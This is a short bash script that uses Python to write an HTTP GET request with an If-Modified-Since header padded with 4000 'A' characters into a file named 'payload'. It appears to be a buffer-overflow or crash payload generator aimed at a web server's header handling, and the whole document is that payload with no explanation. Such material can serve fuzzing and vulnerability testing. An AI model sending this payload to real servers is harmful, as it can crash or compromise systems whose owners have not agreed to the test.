#!/bin/bash

python3 -c 'print("GET / HTTP/1.1\r\nIf-Modified-Since: " + "A"*4000 + "\r\n\r\n")' > payload
